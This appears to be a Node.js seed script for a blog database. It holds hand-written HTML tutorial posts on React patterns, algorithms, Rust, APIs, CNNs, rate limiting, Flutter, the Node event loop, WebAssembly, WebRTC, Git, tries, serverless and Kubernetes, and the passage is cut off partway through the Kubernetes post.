const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const fs = require('fs');
const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });

const User = require('../models/User');
const Post = require('../models/Post');
const Comment = require('../models/Comment');

const postImageUrls = JSON.parse(fs.readFileSync(path.join(__dirname, 'postImageUrls.json'), 'utf8'));
const userImageUrls = JSON.parse(fs.readFileSync(path.join(__dirname, 'userImageUrls.json'), 'utf8'));

// ─── 50 hand-written posts ───────────────────────────────────────────────────
// ─── Batch 1: Posts 1 to 10 ───────────────────────────────────────────────────
const posts = [
  {
    title: "Advanced React Patterns: Compound Components",
    tags: ["react", "frontend", "javascript", "advanced", "ui"],
    content: `
<h2>Understanding Compound Components</h2>
<p>As React applications grow, standard component props can become unwieldy. The <strong>Compound Components</strong> pattern is an advanced technique used by popular libraries like <a href="https://reach.tech/">Reach UI</a> and Headless UI to build expressive and flexible APIs.</p>
<hr>
<h3>The Problem with Prop Drilling</h3>
<p>When you build a complex <code>&lt;Select /&gt;</code> or <code>&lt;Tabs /&gt;</code> component, passing everything via props leads to a messy API. Instead, compound components use React Context to implicitly share state between a parent and its children.</p>
<blockquote>
  "Compound components are a pattern where components are used together such that they share an implicit state that let's them communicate with each other in the background."
</blockquote>
<h3>Implementation Example</h3>
<p>Let's build a custom <code>&lt;Toggle&gt;</code> component.</p>
<pre><code>import React, { createContext, useContext, useState } from 'react';

const ToggleContext = createContext();

export function Toggle({ children }) {
  const [on, setOn] = useState(false);
  const toggle = () => setOn(!on);
  
  return (
    &lt;ToggleContext.Provider value={{ on, toggle }}&gt;
      {children}
    &lt;/ToggleContext.Provider&gt;
  );
}

export function ToggleOn({ children }) {
  const { on } = useContext(ToggleContext);
  return on ? children : null;
}

export function ToggleOff({ children }) {
  const { on } = useContext(ToggleContext);
  return on ? null : children;
}

export function ToggleButton() {
  const { on, toggle } = useContext(ToggleContext);
  return &lt;button onClick={toggle}&gt;{on ? 'Turn Off' : 'Turn On'}&lt;/button&gt;;
}</code></pre>
<h3>How to Use It</h3>
<p>Now, the consumer of the component dictates the layout, not the creator:</p>
<pre><code>&lt;Toggle&gt;
  &lt;ToggleOn&gt;The button is on!&lt;/ToggleOn&gt;
  &lt;ToggleOff&gt;The button is off.&lt;/ToggleOff&gt;
  &lt;ToggleButton /&gt;
&lt;/Toggle&gt;</code></pre>
<ul>
  <li><strong>Pros:</strong> Extremely flexible, avoids prop drilling, cleaner consumer API.</li>
  <li><strong>Cons:</strong> Tightly couples child components to the parent context.</li>
</ul>
<p>Try applying this pattern the next time you build a Modal, Accordion, or Dropdown menu!</p>
    `
  },
  {
    title: "Mastering Dynamic Programming: The 0/1 Knapsack Problem",
    tags: ["dsa", "dynamic programming", "algorithms", "cp", "c++"],
    content: `
<h2>The Essence of Dynamic Programming</h2>
<p>Dynamic Programming (DP) strikes fear into the hearts of many developers, but at its core, it is simply an optimization over plain recursion. Whenever you see overlapping subproblems and optimal substructure, DP is the answer.</p>
<hr>
<h3>The 0/1 Knapsack Problem</h3>
<p>Imagine you are a thief with a knapsack that holds a maximum weight <code>W</code>. You are presented with <code>N</code> items, each with a <em>weight</em> and a <em>value</em>. You want to maximize your total value without exceeding the weight limit. You cannot break items (hence 0 or 1: take it or leave it).</p>
<h3>The Recursive Approach (TLE)</h3>
<p>The brute force way is to try all combinations. The time complexity is <s>O(N)</s> <strong>O(2^N)</strong>, which will Result in Time Limit Exceeded (TLE) on platforms like LeetCode or Codeforces.</p>
<h3>The Tabulation Approach (Bottom-Up)</h3>
<p>We can solve this efficiently using a 2D DP array where <code>dp[i][w]</code> represents the maximum value using the first <code>i</code> items with a weight limit of <code>w</code>.</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;algorithm&gt;

using namespace std;

int knapsack(int W, vector&lt;int&gt;&wt, vector&lt;int&gt;&val, int n) {
    vector&lt;vector&lt;int&gt;&gt; dp(n + 1, vector&lt;int&gt;(W + 1, 0));

    for (int i = 1; i &lt;= n; i++) {
        for (int w = 0; w &lt;= W; w++) {
            if (wt[i - 1] &lt;= w) {
                // Max of including the item vs excluding it
                dp[i][w] = max(val[i - 1] + dp[i - 1][w - wt[i - 1]], dp[i - 1][w]);
            } else {
                dp[i][w] = dp[i - 1][w];
            }
        }
    }
    return dp[n][W];
}</code></pre>
<h3>Space Optimization</h3>
<p>Notice how <code>dp[i][w]</code> only relies on the previous row <code>dp[i - 1]</code>? We can optimize the space complexity from <strong>O(N * W)</strong> to <strong>O(W)</strong> by using a 1D array.</p>
<ol>
  <li>Initialize a 1D array of size <code>W + 1</code> with zeros.</li>
  <li>Iterate through items, and update the array <em>backwards</em> to prevent using the same item twice.</li>
</ol>
<p>Mastering this opens the door to variations like <em>Subset Sum</em>, <em>Partition Equal Subset Sum</em>, and <em>Coin Change</em>!</p>
    `
  },
  {
    title: "Rust Memory Management: Demystifying the Borrow Checker",
    tags: ["rust", "systems programming", "memory management", "backend"],
    content: `
<h2>Why Rust?</h2>
<p>Rust has been Stack Overflow's most loved language for years. Its main selling point is guaranteeing memory safety without a garbage collector. It achieves this via three concepts: <strong>Ownership, Borrowing, and Lifetimes</strong>.</p>
<hr>
<h3>The Rules of Ownership</h3>
<p>Before writing Rust, you must memorize these three rules:</p>
<ol>
  <li>Each value in Rust has a variable that’s called its <em>owner</em>.</li>
  <li>There can only be one owner at a time.</li>
  <li>When the owner goes out of scope, the value will be dropped.</li>
</ol>
<h3>Move Semantics</h3>
<p>In languages like JavaScript or Python, objects are passed by reference. In Rust, they are moved.</p>
<pre><code>fn main() {
    let s1 = String::from("hello");
    let s2 = s1;

    // println!("{}, world!", s1); // ERROR! s1 has been moved to s2.
    println!("{}, world!", s2); // This works.
}</code></pre>
<h3>Borrowing: References</h3>
<p>Moving data constantly is tedious. Instead, we can <em>borrow</em> data using references (<code>&amp;</code>).</p>
<pre><code>fn calculate_length(s: &amp;String) -&gt; usize {
    s.len()
} // s goes out of scope, but since it doesn't own the string, nothing happens.

fn main() {
    let s1 = String::from("hello");
    let len = calculate_length(&amp;s1);
    println!("The length of '{}' is {}.", s1, len);
}</code></pre>
<blockquote>
  "You can have either one mutable reference or any number of immutable references, but not both at the same time."
</blockquote>
<h3>Conclusion</h3>
<p>The borrow checker often feels like it's fighting you. But once you realize it's preventing data races and segmentation faults at compile-time, it becomes your best friend. For deeper reading, check out <a href="https://doc.rust-lang.org/book/">The Rust Programming Language Book</a>.</p>
    `
  },
  {
    title: "GraphQL vs REST in 2026: Making the Right Choice",
    tags: ["api", "graphql", "backend", "web development", "architecture"],
    content: `
<h2>The API Dilemma</h2>
<p>For over a decade, REST (Representational State Transfer) was the undisputed king of web APIs. But with complex client applications demanding precise data, GraphQL emerged as a powerful alternative. Which one should you pick for your next project?</p>
<hr>
<h3>The Problem with REST</h3>
<p>In REST, endpoints are tied to specific data shapes. This often leads to two major issues:</p>
<ul>
  <li><strong>Over-fetching:</strong> Getting more data than you need (e.g., fetching a whole user object just to get their avatar URL).</li>
  <li><strong>Under-fetching:</strong> Having to make multiple sequential network requests to get nested data (N+1 problem on the client).</li>
</ul>
<h3>How GraphQL Solves This</h3>
<p>GraphQL exposes a single endpoint (usually <code>/graphql</code>). The client sends a query specifying exactly what it wants.</p>
<pre><code>// Client Query
query GetUserProfile {
  user(id: "123") {
    name
    avatarUrl
    recentPosts(limit: 3) {
      title
      likes
    }
  }
}</code></pre>
<p>The backend processes this and returns JSON matching that exact shape. No more, no less.</p>
<h3>When to choose REST</h3>
<p>Despite GraphQL's benefits, REST is far from dead. You should stick with REST if:</p>
<ol>
  <li>Your API is public and consumed by generic third parties.</li>
  <li>You rely heavily on HTTP-level caching (GraphQL struggles with native browser caching because it uses POST requests).</li>
  <li>You are building a simple microservice with flat data models.</li>
</ol>
<h3>Conclusion</h3>
<p>GraphQL shines in complex, deeply nested domains with multiple frontends (web, iOS, Android) requiring different data shapes. REST is better for simple, resource-driven architectures. <em>Don't use GraphQL just because it is trendy; evaluate your data access patterns first.</em></p>
    `
  },
  {
    title: "Deep Learning Demystified: Convolutional Neural Networks (CNNs)",
    tags: ["ai", "machine learning", "computer vision", "python", "deep learning"],
    content: `
<h2>Seeing the World Through Algorithms</h2>
<p>Before Convolutional Neural Networks (CNNs), image recognition was a painstaking process of manual feature extraction. Today, CNNs power everything from facial recognition to self-driving cars. Let's break down how they work.</p>
<hr>
<h3>The Architecture of a CNN</h3>
<p>A standard CNN consists of three main types of layers:</p>
<ol>
  <li><strong>Convolutional Layers:</strong> These apply filters (kernels) to the input image to extract features like edges, corners, and textures.</li>
  <li><strong>Pooling Layers:</strong> These reduce the spatial dimensions (width and height) of the image, keeping only the most important information, which reduces computational load.</li>
  <li><strong>Fully Connected Layers:</strong> These flatten the final output and map the extracted features to class probabilities (e.g., "Dog: 90%, Cat: 10%").</li>
</ol>
<blockquote>
  "A CNN learns the filters automatically during training. In lower layers, it learns edges. In deeper layers, it learns complex shapes like eyes or wheels."
</blockquote>
<h3>Implementing a Simple CNN in PyTorch</h3>
<pre><code>import torch.nn as nn
import torch.nn.functional as F

class SimpleCNN(nn.Module):
    def __init__(self):
        super(SimpleCNN, self).__init__()
        # 1 input channel (grayscale), 32 output channels, 3x3 kernel
        self.conv1 = nn.Conv2d(1, 32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2)
        self.conv2 = nn.Conv2d(32, 64, kernel_size=3, padding=1)
        self.fc1 = nn.Linear(64 * 7 * 7, 128)
        self.fc2 = nn.Linear(128, 10) # 10 classes for MNIST

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 64 * 7 * 7) # Flatten
        x = F.relu(self.fc1(x))
        x = self.fc2(x)
        return x</code></pre>
<h3>Why Pooling?</h3>
<p>Max pooling takes the largest value in a defined window. This creates <strong>translation invariance</strong>. If a cat is slightly to the left or right in an image, the network will still recognize it.</p>
<p>CNNs are the backbone of modern Computer Vision. Start by practicing on datasets like MNIST or CIFAR-10 before moving on to architectures like ResNet or YOLO!</p>
    `
  },
  {
    title: "System Design: API Rate Limiting Algorithms",
    tags: ["system design", "backend", "architecture", "scalability"],
    content: `
<h2>Protecting Your Infrastructure</h2>
<p>If your API is public, you need to protect it from DDoS attacks, brute force login attempts, and overly aggressive scrapers. Rate limiting is the process of controlling the number of requests a client can make in a given timeframe.</p>
<hr>
<h3>Common Algorithms</h3>
<p>There is no one-size-fits-all approach to rate limiting. Here are the top three algorithms used in production:</p>
<h3>1. Token Bucket</h3>
<p>Imagine a bucket that holds a maximum of <code>N</code> tokens. Every second, a new token drops into the bucket. When a request comes in, it takes a token. If the bucket is empty, the request is dropped (HTTP 429 Too Many Requests).</p>
<ul>
  <li><strong>Pros:</strong> Allows for bursts of traffic. Memory efficient.</li>
  <li><strong>Used by:</strong> Amazon EC2, Stripe API.</li>
</ul>
<h3>2. Leaky Bucket</h3>
<p>Similar to Token Bucket, but requests are processed at a constant rate via a queue. If the queue is full, new requests are discarded.</p>
<ul>
  <li><strong>Pros:</strong> Smooths out bursty traffic, providing a stable outflow.</li>
  <li><strong>Cons:</strong> A burst of traffic can fill the queue with old requests, blocking new ones.</li>
</ul>
<h3>3. Fixed Window Counter</h3>
<p>Divides time into fixed windows (e.g., 1:00 to 1:01). A counter increments per request. If it exceeds the limit, requests drop until the next window.</p>
<pre><code>// Simple Redis-backed Fixed Window in Node.js
async function rateLimit(req, res, next) {
  const ip = req.ip;
  const currentMinute = Math.floor(Date.now() / 60000);
  const key = \`rate_limit:\${ip}:\${currentMinute}\`;

  const requests = await redis.incr(key);
  if (requests === 1) {
    await redis.expire(key, 60); // expire in 60s
  }

  if (requests &gt; 100) {
    return res.status(429).send('Too Many Requests');
  }
  next();
}</code></pre>
<h3>The Spiky Edge Case</h3>
<p>Fixed Window has a flaw: if 100 requests hit at 1:00:59 and 100 hit at 1:01:01, you've processed 200 requests in 2 seconds! To solve this, large systems use the <strong>Sliding Window Log</strong> or <strong>Sliding Window Counter</strong> algorithms.</p>
    `
  },
  {
    title: "Flutter State Management: Provider vs Riverpod vs BLoC",
    tags: ["flutter", "app development", "dart", "mobile", "frontend"],
    content: `
<h2>The State of Flutter</h2>
<p>One of the biggest hurdles for beginners in Flutter is choosing a state management solution. Unlike React, where Redux or Context ruled for years, Flutter has a highly fragmented ecosystem. Let's compare the big three.</p>
<hr>
<h3>1. Provider</h3>
<p>Created by the community and endorsed by Google, Provider is essentially an wrapper around <code>InheritedWidget</code>. It makes passing data down the widget tree simple.</p>
<pre><code>class Counter with ChangeNotifier {
  int _count = 0;
  int get count =&gt; _count;

  void increment() {
    _count++;
    notifyListeners();
  }
}

// In your UI
Text('\${context.watch&lt;Counter&gt;().count}')</code></pre>
<p><strong>Verdict:</strong> Great for beginners and small-to-medium apps, but it relies on the widget tree, which can cause <code>ProviderNotFoundException</code> if you aren't careful.</p>
<h3>2. Riverpod</h3>
<p>Created by the same author as Provider, Riverpod fixes all of Provider's flaws. It catches errors at compile-time instead of runtime and doesn't depend on the widget tree.</p>
<pre><code>final counterProvider = StateProvider((ref) =&gt; 0);

// In a ConsumerWidget
final count = ref.watch(counterProvider);</code></pre>
<p><strong>Verdict:</strong> The modern standard. If you are starting a new Flutter project today, <strong>choose Riverpod</strong>.</p>
<h3>3. BLoC (Business Logic Component)</h3>
<p>BLoC relies heavily on Streams and Events. You map incoming events to outgoing states.</p>
<pre><code>abstract class CounterEvent {}
class Increment extends CounterEvent {}

class CounterBloc extends Bloc&lt;CounterEvent, int&gt; {
  CounterBloc() : super(0) {
    on&lt;Increment&gt;((event, emit) =&gt; emit(state + 1));
  }
}</code></pre>
<p><strong>Verdict:</strong> Extremely verbose, but provides the most predictable architecture for massive enterprise applications. It forces a strict separation of concerns.</p>
<p>Don't get paralyzed by choice. Pick one, learn it deeply, and focus on building great user experiences!</p>
    `
  },
  {
    title: "Graph Algorithms: Dijkstra's vs Bellman-Ford",
    tags: ["dsa", "graphs", "competitive coding", "algorithms", "c++"],
    content: `
<h2>The Shortest Path Problem</h2>
<p>Finding the shortest path between nodes in a graph is a foundational problem in computer science, used in GPS routing, network routing protocols, and video game AI. But which algorithm should you use?</p>
<hr>
<h3>Dijkstra's Algorithm</h3>
<p>Dijkstra's is a greedy algorithm. It explores the closest unvisited node using a Priority Queue (Min-Heap). It guarantees the shortest path <em>only if all edge weights are non-negative</em>.</p>
<ul>
  <li><strong>Time Complexity:</strong> O(V + E log V)</li>
  <li><strong>Use Case:</strong> Real-world road networks (distances can't be negative).</li>
</ul>
<pre><code>void dijkstra(int start, vector&lt;vector&lt;pair&lt;int, int&gt;&gt;&gt;&amp; adj, vector&lt;int&gt;&amp; dist) {
    priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq;
    pq.push({0, start});
    dist[start] = 0;

    while (!pq.empty()) {
        int d = pq.top().first;
        int u = pq.top().second;
        pq.pop();

        if (d &gt; dist[u]) continue; // Optimization

        for (auto edge : adj[u]) {
            int v = edge.first, weight = edge.second;
            if (dist[u] + weight &lt; dist[v]) {
                dist[v] = dist[u] + weight;
                pq.push({dist[v], v});
            }
        }
    }
}</code></pre>

<h3>Bellman-Ford Algorithm</h3>
<p>Bellman-Ford is based on Dynamic Programming. It relaxes all edges <code>V - 1</code> times. It is slower, but it handles <strong>negative edge weights</strong> and can detect negative weight cycles.</p>
<ul>
  <li><strong>Time Complexity:</strong> O(V * E)</li>
  <li><strong>Use Case:</strong> Financial arbitrage (where negative weights represent profits).</li>
</ul>
<pre><code>bool bellmanFord(int V, int src, vector&lt;vector&lt;int&gt;&gt;&amp; edges, vector&lt;int&gt;&amp; dist) {
    dist[src] = 0;
    
    // Relax all edges V-1 times
    for (int i = 0; i &lt; V - 1; i++) {
        for (auto edge : edges) {
            int u = edge[0], v = edge[1], w = edge[2];
            if (dist[u] != 1e9 &amp;&amp; dist[u] + w &lt; dist[v]) {
                dist[v] = dist[u] + w;
            }
        }
    }
    
    // Check for negative cycle
    for (auto edge : edges) {
        int u = edge[0], v = edge[1], w = edge[2];
        if (dist[u] != 1e9 &amp;&amp; dist[u] + w &lt; dist[v]) {
            return true; // Cycle detected!
        }
    }
    return false;
}</code></pre>
<blockquote>
  "In an interview, always ask if the graph has negative weights before diving into Dijkstra's algorithm!"
</blockquote>
    `
  },
  {
    title: "The Node.js Event Loop: A Deep Dive",
    tags: ["nodejs", "javascript", "backend", "performance", "architecture"],
    content: `
<h2>JavaScript is Single Threaded... So How is Node Fast?</h2>
<p>It's a common misconception that Node.js does everything on a single thread. While your JavaScript code executes on a single thread, Node offloads expensive I/O operations (like file reading or network requests) to the C++ libuv library, which uses a thread pool. The orchestrator of this process is the <strong>Event Loop</strong>.</p>
<hr>
<h3>The Phases of the Event Loop</h3>
<p>The event loop executes in specific phases, processing queues of callbacks. Let's look at the main phases in order:</p>
<ol>
  <li><strong>Timers:</strong> Executes callbacks scheduled by <code>setTimeout()</code> and <code>setInterval()</code>.</li>
  <li><strong>Pending Callbacks:</strong> Executes I/O callbacks deferred to the next loop iteration.</li>
  <li><strong>Poll:</strong> Retrieves new I/O events; executes I/O related callbacks (almost all, with the exception of close callbacks, timers, and setImmediate).</li>
  <li><strong>Check:</strong> Executes callbacks scheduled by <code>setImmediate()</code>.</li>
  <li><strong>Close Callbacks:</strong> e.g., <code>socket.on('close', ...)</code>.</li>
</ol>
<h3>Microtasks vs Macrotasks</h3>
<p>Between every phase, Node checks the microtask queue. Microtasks execute <em>before</em> the event loop moves to the next phase.</p>
<ul>
  <li><strong>Microtasks:</strong> <code>process.nextTick()</code>, <code>Promises</code></li>
  <li><strong>Macrotasks:</strong> <code>setTimeout</code>, <code>setImmediate</code>, I/O</li>
</ul>
<h3>The Ultimate Interview Question</h3>
<p>Can you guess the output of this code?</p>
<pre><code>const fs = require('fs');

console.log('1. Start');

setTimeout(() =&gt; console.log('2. setTimeout'), 0);

setImmediate(() =&gt; console.log('3. setImmediate'));

Promise.resolve().then(() =&gt; console.log('4. Promise'));

process.nextTick(() =&gt; console.log('5. nextTick'));

console.log('6. End');</code></pre>
<p><strong>The Output:</strong></p>
<ol>
  <li><code>1. Start</code></li>
  <li><code>6. End</code></li>
  <li><code>5. nextTick</code> (highest priority microtask)</li>
  <li><code>4. Promise</code> (microtask)</li>
  <li><code>2. setTimeout</code> (Timers phase)</li>
  <li><code>3. setImmediate</code> (Check phase - note: timing between timeout 0 and immediate can fluctuate if not in an I/O cycle)</li>
</ol>
<p>Understanding these phases is critical to preventing event loop blockages and writing high-performance Node.js backends.</p>
    `
  },
  {
    title: "Introduction to WebAssembly (Wasm): The Future of the Web",
    tags: ["wasm", "web development", "performance", "c++", "rust"],
    content: `
<h2>Breaking the JavaScript Monopoly</h2>
<p>For decades, JavaScript was the only language that could run natively in the browser. <strong>WebAssembly (Wasm)</strong> changed that. Wasm is a binary instruction format designed to run alongside JavaScript at near-native speed.</p>
<hr>
<h3>What Wasm Is NOT</h3>
<p>WebAssembly is <s>not a replacement for JavaScript</s>. It is designed to complement it. You use JavaScript for DOM manipulation and UI logic, and you offload heavy computational tasks (like video editing, physics simulations, or 3D rendering) to Wasm modules.</p>
<h3>How It Works</h3>
<ol>
  <li>Write code in a low-level language like C, C++, or Rust.</li>
  <li>Compile that code into a <code>.wasm</code> binary file using a toolchain like Emscripten.</li>
  <li>Load the binary in your web app using the JavaScript WebAssembly API.</li>
</ol>
<h3>A Simple Example (C to Web)</h3>
<p>Imagine this simple C code:</p>
<pre><code>int add(int a, int b) {
    return a + b;
}</code></pre>
<p>Once compiled to Wasm, you can instantiate and call it directly from JavaScript:</p>
<pre><code>// Fetch and instantiate the Wasm module
WebAssembly.instantiateStreaming(fetch('math.wasm'))
  .then(obj =&gt; {
    // Call the C function from JS!
    const result = obj.instance.exports.add(5, 7);
    console.log(result); // Outputs 12
  });</code></pre>
<h3>Real-World Use Cases</h3>
<p>Companies are leveraging Wasm to bring massive desktop applications to the browser:</p>
<ul>
  <li><strong>Figma:</strong> Uses C++ compiled to Wasm for its high-performance rendering engine.</li>
  <li><strong>AutoCAD:</strong> Brought a decades-old C++ codebase to the web without rewriting it.</li>
  <li><strong>TensorFlow.js:</strong> Uses Wasm backend for fast machine learning inference in the browser.</li>
</ul>
<p>If you want to dive deeper, check out the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly">MDN WebAssembly Documentation</a>.</p>
    `
  },
  {
    title: "WebRTC: Building Peer-to-Peer Video Chat",
    tags: ["webrtc", "video", "streaming", "javascript", "networking"],
    content: `
<h2>The Magic of Real-Time Communication</h2>
<p>WebRTC (Web Real-Time Communication) is an open-source project that enables real-time voice, text, and video communications capabilities between web browsers. Unlike traditional client-server models, WebRTC connects browsers <strong>directly</strong> (Peer-to-Peer).</p>
<hr>
<h3>How WebRTC Connects Peers</h3>
<p>Connecting two browsers directly is incredibly difficult due to firewalls and NAT (Network Address Translation). WebRTC solves this using a process called <em>Signaling</em>, alongside STUN and TURN servers.</p>
<ul>
  <li><strong>Signaling Server:</strong> Used to exchange connection data (SDP offers and ICE candidates) before the P2P connection is established. You must build this yourself using WebSockets.</li>
  <li><strong>STUN Server:</strong> Tells the browser its public IP address.</li>
  <li><strong>TURN Server:</strong> A fallback relay server used if the P2P connection fails due to strict firewalls.</li>
</ul>
<blockquote>
  "WebRTC handles the audio/video capturing and network transport, but you are responsible for the signaling mechanism to help peers find each other."
</blockquote>
<h3>Getting the Media Stream</h3>
<p>The first step is accessing the user's camera and microphone using the <code>navigator.mediaDevices</code> API.</p>
<pre><code>async function startVideo() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: true, 
      audio: true 
    });
    
    // Attach stream to a video element
    const localVideo = document.getElementById('localVideo');
    localVideo.srcObject = stream;
    
    return stream;
  } catch (error) {
    console.error('Error accessing media devices.', error);
  }
}</code></pre>
<h3>Creating the Peer Connection</h3>
<pre><code>const configuration = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' } // Free Google STUN
  ]
};

const peerConnection = new RTCPeerConnection(configuration);

// Add local stream tracks to the connection
localStream.getTracks().forEach(track =&gt; {
  peerConnection.addTrack(track, localStream);
});

// Listen for remote tracks
peerConnection.ontrack = (event) =&gt; {
  const remoteVideo = document.getElementById('remoteVideo');
  remoteVideo.srcObject = event.streams[0];
};</code></pre>
<p>Building a full WebRTC app requires handling ICE candidates and SDP offers/answers. To explore further, read the official <a href="https://webrtc.org/getting-started/overview">WebRTC Architecture documentation</a>.</p>
    `
  },
  {
    title: "Advanced Git: Mastering Interactive Rebase and Bisect",
    tags: ["git", "version-control", "devops", "productivity", "cli"],
    content: `
<h2>Beyond Add, Commit, and Push</h2>
<p>Most developers only scratch the surface of Git. If you want to maintain a clean history and track down elusive bugs, you need to master <strong>Interactive Rebase</strong> and <strong>Git Bisect</strong>.</p>
<hr>
<h3>Rewriting History with Interactive Rebase</h3>
<p>Have you ever made 10 messy commits like <em>"fix typo"</em>, <em>"wip"</em>, and <em>"actually fix it"</em>? You can squash these into one clean commit using interactive rebase.</p>
<pre><code># Rebase the last 5 commits
git rebase -i HEAD~5</code></pre>
<p>This opens your editor with a list of commits. You can change the command from <code>pick</code> to:</p>
<ul>
  <li><code>reword</code>: Change the commit message.</li>
  <li><code>edit</code>: Stop and amend the commit.</li>
  <li><code>squash</code> (or <code>s</code>): Meld this commit into the previous one.</li>
  <li><code>drop</code> (or <code>d</code>): Completely remove the commit.</li>
</ul>
<blockquote>
  "Golden Rule: Never rebase commits that have already been pushed to a shared public branch. Only rewrite your local, unpublished history."
</blockquote>
<h3>Finding Bugs with Git Bisect</h3>
<p>Imagine a bug was introduced sometime in the last 100 commits, but you don't know when. <code>git bisect</code> uses binary search to find the exact commit that broke the code in O(log N) steps!</p>
<ol>
  <li>Start the bisect process: <code>git bisect start</code></li>
  <li>Mark the current (broken) state: <code>git bisect bad</code></li>
  <li>Mark an older (working) commit: <code>git bisect good v1.0.0</code></li>
</ol>
<p>Git will checkout a commit in the middle. You test the code, then type <code>git bisect good</code> or <code>git bisect bad</code>. Git will halve the search space again until it finds the culprit.</p>
<pre><code># Automating bisect with a script
git bisect run npm test</code></pre>
<p>This automatically runs your test suite against the commits, finding the bug without any manual intervention. Magic!</p>
    `
  },
  {
    title: "Data Structures: The Trie (Prefix Tree) Explained",
    tags: ["trees", "dsa-trie", "string-matching", "autocomplete", "java"],
    content: `
<h2>Lightning Fast String Searching</h2>
<p>When you type into Google and it instantly suggests completions, it's not searching through a giant array of strings. It's using a specialized tree data structure called a <strong>Trie</strong> (pronounced "try").</p>
<hr>
<h3>What is a Trie?</h3>
<p>A Trie is an N-ary tree where characters are stored at each node. A path down the tree represents a word. It is highly optimized for prefix-matching and word validation.</p>
<h3>Time and Space Complexity</h3>
<ul>
  <li><strong>Insertion:</strong> <code>O(L)</code> where <em>L</em> is the length of the word.</li>
  <li><strong>Search:</strong> <code>O(L)</code></li>
  <li><strong>Space Complexity:</strong> <code>O(N * L * Alphabet_Size)</code>. They are very memory-heavy compared to Hash Sets, which is the main trade-off.</li>
</ul>
<h3>Implementing a Trie Node in Java</h3>
<pre><code>class TrieNode {
    TrieNode[] children;
    boolean isEndOfWord;

    public TrieNode() {
        // Assuming lowercase English letters only
        children = new TrieNode[26]; 
        isEndOfWord = false;
    }
}</code></pre>
<h3>Insertion Logic</h3>
<p>To insert "APPLE", we check if 'A' exists in the root's children. If not, we create it. We move to 'A', check for 'P', and so on. At the final 'E', we set <code>isEndOfWord = true</code>.</p>
<pre><code>class Trie {
    private TrieNode root;

    public Trie() {
        root = new TrieNode();
    }

    public void insert(String word) {
        TrieNode curr = root;
        for (char c : word.toCharArray()) {
            int index = c - 'a';
            if (curr.children[index] == null) {
                curr.children[index] = new TrieNode();
            }
            curr = curr.children[index];
        }
        curr.isEndOfWord = true;
    }
    
    public boolean startsWith(String prefix) {
        TrieNode curr = root;
        for (char c : prefix.toCharArray()) {
            int index = c - 'a';
            if (curr.children[index] == null) return false;
            curr = curr.children[index];
        }
        return true; // The prefix exists!
    }
}</code></pre>
<p>If you want to practice Tries, check out problems like <em>"Implement Trie"</em>, <em>"Design Add and Search Words Data Structure"</em>, and <em>"Word Search II"</em> on LeetCode.</p>
    `
  },
  {
    title: "Serverless Architecture: The Good, The Bad, and The Cold Starts",
    tags: ["serverless", "aws", "lambda", "cloud-computing", "microservices-alternative"],
    content: `
<h2>Rethinking Backend Infrastructure</h2>
<p>The term <strong>Serverless</strong> is a bit of a misnomer. There are still servers, but you don't manage them. You write functions, deploy them to a cloud provider (like AWS Lambda or Vercel Functions), and only pay for the exact milliseconds your code executes.</p>
<hr>
<h3>The Advantages of Serverless</h3>
<p>Why are startups and enterprises migrating to Serverless architectures?</p>
<ul>
  <li><strong>Auto-Scaling:</strong> If your traffic goes from 0 to 10,000 requests per second, the cloud provider instantly spins up 10,000 instances of your function.</li>
  <li><strong>Pay-per-use Cost:</strong> You pay zero dollars when no one is using your API. Traditional servers cost money 24/7.</li>
  <li><strong>Reduced DevOps:</strong> No OS patching, no SSHing into servers, no load balancer configurations.</li>
</ul>
<blockquote>
  "Serverless shifts the operational responsibility of provisioning, scaling, and managing servers to the cloud provider."
</blockquote>
<h3>The Elephant in the Room: Cold Starts</h3>
<p>If a function hasn't been called in a while, the cloud provider spins down the container. The next time someone makes a request, the provider has to boot a new container, load the runtime, and load your code. This is a <strong>Cold Start</strong>.</p>
<p>Cold starts can add anywhere from <s>500ms</s> to <strong>3 seconds</strong> of latency to a request. You can mitigate this by:</p>
<ol>
  <li>Using languages with fast boot times (Go, Rust, Node.js) instead of heavy runtimes like Java.</li>
  <li>Keeping your deployment package small. Don't import massive libraries if you only need one utility function.</li>
  <li>Using "Provisioned Concurrency" (AWS) to keep a few instances constantly warm (though this defeats the cost-saving aspect).</li>
</ol>
<h3>When NOT to use Serverless</h3>
<p>Serverless is terrible for long-running processes (e.g., video rendering) and WebSocket connections that require persistent, long-lived server states. For those, stick to Docker containers on services like AWS ECS or DigitalOcean App Platform.</p>
    `
  },
  {
    title: "Kubernetes (K8s) for Developers: A Gentle Introduction",
    tags: ["kubernetes", "k8s", "containers", "orchestration", "deployment"],
    content: `
<h2>Taming the Container Chaos</h2>
<p>Docker solved the <em>"it works on my machine"</em> problem by containerizing applications. But what happens when you have 50 containers running across 10 different servers? How do they talk to each other? What if one crashes? Enter <strong>Kubernetes (K8s)</strong>.</p>
<hr>
<h3>What is Kubernetes?</h3>
<p>Kubernetes is an open-source container orchestration system. You declare the desired state of your infrastructure, and K8s constantly works to maintain that state.</p>
<h3>Core Concepts</h3>
<ul>
  <li><strong>Pod:</strong> The smallest deployable unit. Usually contains one Docker container. Pods are ephemeral (they die and are replaced).</li>
  <li><strong>Deployment:</strong> Defines how many replicas of a Pod should run. If a Pod crashes, the Deployment spins up a new one automatically.</li>
  <li><strong>Service:</strong> Provides a stable IP address and load balancing to a set of Pods. Since Pod IPs change when they die, Services are essential for networking.</li>
</ul>
<h3>Declarative Infrastructure</h3>
<p>In K8s, you don't run commands to start containers. You write YAML manifests.</p>
<pre><code>apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-backend
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-backend
  template:
    metadata:
      labels:
        app: my-backend
    spec:
      containers:
      - name: nodejs-app
        image: myrepo/my-backend:latest
        ports:
        - containerPort: 3000</code></pre>
<p>You apply this configuration using the CLI tool: <code>kubectl apply -f deployment.yaml</code>.</p>
<blockquote>
